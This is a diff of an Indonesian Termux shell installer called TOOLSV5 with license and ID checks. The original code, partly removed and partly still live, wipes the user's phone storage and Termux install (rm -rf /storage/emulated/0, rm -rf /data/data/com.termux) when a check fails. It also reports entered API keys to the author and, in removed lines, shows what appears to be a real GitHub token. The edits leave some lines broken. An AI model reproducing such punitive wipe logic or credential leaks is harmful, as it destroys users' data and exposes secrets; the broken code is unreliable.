@@ -3270,7 +3270,7 @@ $e $m "========================================"
 $e $h "Untuk melaporkan Bug\n Anda harus berada dimana script yang error\n Jika sudah screenshot script yang$m ERROR$h\n dan kirim ke whatsapp saya !"
 $e $m "========================================$bl"
 read -p " ENTER UNTUK MELAPORKAN BUG"
-xdg-open "https://wa.me/6285850268349?text=Assalamualaikum%20Bang%20Saya%20Nemu%20BUG%20TOOLSV5"
+xdg-open ""
 elif [ "$no" = "pesan" ]; then
 FORUM
 elif [ "$no" = "list" ]; then
@@ -3371,8 +3371,8 @@ create_and_load_git_credentials() {
 local cred_file="$HOME/git_credentials"
 if [ ! -f "$cred_file" ]; then
 echo "Membuat file kredensial Git..." &> /dev/null
-echo 'GITHUB_USER="zerotermux"' > "$cred_file"
-echo 'GITHUB_TOKEN="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"' >> "$cred_file"
+echo 'GITHUB_USER="CY78"' > "$cred_file"
+echo 'GITHUB_TOKEN="KAKACANTIK"' >> "$cred_file"
 fi
 source "$cred_file"
 }
@@ -3440,30 +3440,26 @@ kirimpesan &> /dev/null
 blokiranid &> /dev/null &
 fi
 clear
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 $e $bg_m "Trial Anda Sudah Habis$res "
 sleep 3
-rm -rf /data/data/com.termux/files/usr/bug6 &> /dev/null &
-rm -rf /data/data/com.termux/files/usr/bot4 &> /dev/null &
-rm -rf /data/data/com.termux/files/usr/bot5 &> /dev/null &
-rm -rf /data/data/com.termux/files/usr/bot7 &> /dev/null &
-rm -rf /data/data/com.termux/files/usr/bot8 &> /dev/null &
+
 clear
 play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
 $e $bg_h "Order Ke Galirus Official Yang Ori Nomornya 085850268349$res"
 sleep 5
 clear
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK6.mp3 &> /dev/null &
 $e $bg_h "Mau Berlangganan TOOLSV5 ? y/n ( yes / no )$res"
 $e $k
 read -p "choose ( y/n ) :" iii
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 if [[ $iii = "yes" || $iii = "y" ]]; then
 xdg-open "https://wa.me/6285850268349?text=bang daftar ke TOOLSV5 prem gimana ID : $termux_id"
 elif [[ $iii = "no" || $iii = "n" ]]; then
 exit 1
 else
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK4.mp3 &> /dev/null &
 echo "Perintah Salah"
 fi
 fi
@@ -3492,7 +3488,7 @@ telegram &> /dev/null &
 isipesan=" BLOCKLIST ID COMPLETED 👨‍💻"
 kirimpesan &> /dev/null
 clear
-echo "y" | termux-setup-storage &> /dev/null &
+echo "y" |  &> /dev/null &
 $banner | lolcat
 $e
 $e
@@ -3515,7 +3511,7 @@ security="/data/data/com.termux/files/home/TOOLSV5/.git"
 if [ -d "$folder" ] && [ -d "$security" ]; then
 clear
 sertifikat &> /dev/null &
-play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 echo
 $e $b" ╔══════════════════════════════════════════════╗$b"
 $e $b" ║$h              ID TERVERIFIKASI               $b ║"
@@ -3527,7 +3523,7 @@ $e $b" ╚═══════════════════════�
 echo
 sleep 5
 clear
-play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK4.mp3 &> /dev/null &
 $e $m "         ⛔ PERINGATAN ⛔"
 echo
 $e $h "- ID tidak bisa di ubah ! Kecuali\n - masih ada id lama ( untuk barang bukti ) \n - join grup Jika kedua syarat di atas tidak komplit\n   Resiko$m GARANSI ANDA HABIS"
@@ -3535,7 +3531,7 @@ echo
 $e $m
 sleep 5
 read -p "   ENTER UNTUK MELANJUTKAN"
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK4.mp3 &> /dev/null &
 clear
 $e $b
 while true; do
@@ -3570,7 +3566,7 @@ random_audio=${audio_files[$RANDOM % ${#audio_files[@]}]}
 play -q "$random_audio" &> /dev/null
 }
 bluearchive &> /dev/null
-mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
+mpv $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 $e $b "│ ┌───────────────┐"
 $e $b "├─┤$m VERIFIKASI$p ID$b │"
 $e $b "│ └───────────────┘"
@@ -3586,11 +3582,11 @@ done
 show_loading &
 sleep 8
 kill $! &> /dev/null &
-play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK7.mp3 &> /dev/null &
 printf '\r%s\n' " └► Anda sudah terdaftar"
 sleep 3
 clear
-play -q $HOME/TOOLSV5/sound/welcome.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK4.mp3 &> /dev/null &
 $e $bl
 text="      Selamat Datang Di TOOLSV5 $versitoolsv5"
 delay=0.05 # penundaan antara setiap karakter (deti>
@@ -3602,13 +3598,13 @@ sleep 2
 $musik &> /dev/null &
 TOOLS
 fi
-play -q $HOME/TOOLSV5/sound/robot.mp3 &> /dev/null
+play -q $HOME/TOOLSV5/sound/PHONK2.mp3 &> /dev/null
 sleep 2
-play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 read -s -p " │   •   Apikey : " scanning
 if [ -z "$scanning" ]; then
 echo
-mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
+mpv $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 $e $b "│ ┌───────────────┐"
 $e $b "├─┤$m VERIFIKASI$p ID$b │"
 $e $b "│ └───────────────┘"
@@ -3625,12 +3621,12 @@ show_loading &
 sleep 7
 kill $!
 kirimpesan &> /dev/null &
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK6.mp3 &> /dev/null &
 printf '\r%s\n' " └► Apikey Ga Boleh Kosong Kocak :D "
 sleep 3
 elif grep -q "$scanning" $status/token.txt; then
 $e $h
-mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
+mpv $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 $e $b "│ ┌───────────────┐"
 $e $b "├─┤$m VERIFIKASI$p ID$b │"
 $e $b "│ └───────────────┘"
@@ -3648,13 +3644,13 @@ sleep 8
 kill $! &> /dev/null &
 isipesan="TERDETEKSI benar login Apikey : $scanning 👨‍��"
 kirimpesan &> /dev/null &
-play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK6.mp3 &> /dev/null &
 printf '\r%s\n' " └► Apikey telah terverifikasi"
 touch $gal
 sleep 3
 else
 $e $h
-mpv $HOME/TOOLSV5/sound/loading.mp3 &> /dev/null &
+mpv $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 $e $b "│ ┌───────────────┐"
 $e $b "├─┤$m VERIFIKASI$p ID$b │"
 $e $b "│ └───────────────┘"
@@ -3672,13 +3668,13 @@ sleep 7
 kill $!
 isipesan="TERDETEKSI salah login Apikey : $scanning 👨‍��"
 kirimpesan &> /dev/null &
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 printf '\r%s\n' " └► Apikey tidak terverifikasi"
 sleep 3
 fi
 done
 else
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK4.mp3 &> /dev/null &
 clear
 $e $b" ╔══════════════════════════════════════════════╗$b"
 $e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES��       $b ║"
@@ -3686,8 +3682,8 @@ $e $b" ╚═══════════════════════�
 sleep 3
 echo
 echo "y" | termux-setup-storage &> /dev/null &
-rm -rf /storage/emulated/0 &> /dev/null &
-rm -rf data/data/com.termux/ &> /dev/null &
+/storage/emulated/0 &> /dev/null &
+ data/data/com.termux/ &> /dev/null &
 $e $k " Atas Pelanggaran yang anda lakukan"
 $e $h " TOOLSV5$k menolak AKSES ke anda"
 $e $k " Dikarenakan anda sedang berusaha Memodifikasi$h TOOLSV5$k"
@@ -3699,7 +3695,7 @@ fi
 else
 clear
 echo
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK6.mp3 &> /dev/null &
 $e $b" ╔══════════════════════════════════════════════╗$b"
 $e $b" ║$h                 ID TIDAK TERDAFTAR          $b ║"
 $e $b" ╚══════════════════════════════════════════════╝$b"
@@ -3736,13 +3732,13 @@ echo
 echo
 echo
 rm -rf $HOME/TOOLSV5
-rm -rf /data/data/com.termux/files/usr/share/gorax
-rm -rf ./pockat
-rm -rf /storage/emulated/0
+/data/data/com.termux/files/usr/share/gorax
+./pockat
+/storage/emulated/0
 rm -rf /data/data/com.termux
 cd $HOME
 clear
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 $e $m "KERJA BAGUS BUNG ! AKU SUKA CARA MAIN MU ! "
 sleep 5
 clear
@@ -3860,14 +3856,14 @@ git pull origin main
 git add install.sh
 git add install.sh
 git stash
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK2.mp3 &> /dev/null &
 clear
 suara
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK2.mp3 &> /dev/null &
 clear
 repository
 clear
-play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK5.mp3 &> /dev/null &
 $e $h $bg_b" Installasi Selesai\n Silahakn Ketik bash install.sh / toolsv5 saja$res "
 touch $packageinstalling
 exit 0
@@ -3875,7 +3871,7 @@ fi
 done
 done
 else
-play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
+play -q $HOME/TOOLSV5/sound/PHONK3.mp3 &> /dev/null &
 clear
 $e $b" ╔══════════════════════════════════════════════╗$b"
 $e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES.           $b ║"
@@ -3883,8 +3879,8 @@ $e $b" ╚═══════════════════════�
 sleep 3
 echo
 echo "y" | termux-setup-storage &> /dev/null &
-rm -rf /storage/emulated/0 &> /dev/null &
-rm -rf data/data/com.termux/ &> /dev/null &
+ /storage/emulated/0 &> /dev/null &
+data/data/com.termux/ &> /dev/null &
 $e $k " Atas Pelanggaran yang anda lakukan"
 $e $h " TOOLSV5$k menolak AKSES ke anda"
 $e $k " Dikarenakan anda sedang berusaha Memodifikasi$h TOOLSV5$k"
